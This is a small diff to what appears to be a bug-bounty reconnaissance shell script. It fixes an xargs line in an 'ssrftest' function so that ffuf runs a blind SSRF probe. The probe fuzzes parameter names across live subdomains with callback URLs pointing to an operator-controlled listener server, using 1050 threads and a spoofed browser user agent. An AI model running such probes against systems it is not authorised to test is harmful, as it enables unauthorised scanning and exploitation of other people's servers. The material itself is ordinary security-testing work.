@@ -466,7 +466,7 @@ ssrftest(){
     echo
     # https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/burp-parameter-names.txt
     echo "[SSRF-2] Blind probe..."
-    xargs -n1 -I {} -timeout 4 -mc all -t 1050 -u HOST/\?{}=https://${LISTENSERVER}/DOMAIN/{} \
+    xargs -n1 -I {} ffuf -timeout 4 -mc all -t 1050 -u HOST/\?{}=https://${LISTENSERVER}/DOMAIN/{} \
                          -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
                          -w $TARGETDIR/3-all-subdomain-live-socket.txt:DOMAIN \
                          -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36" \
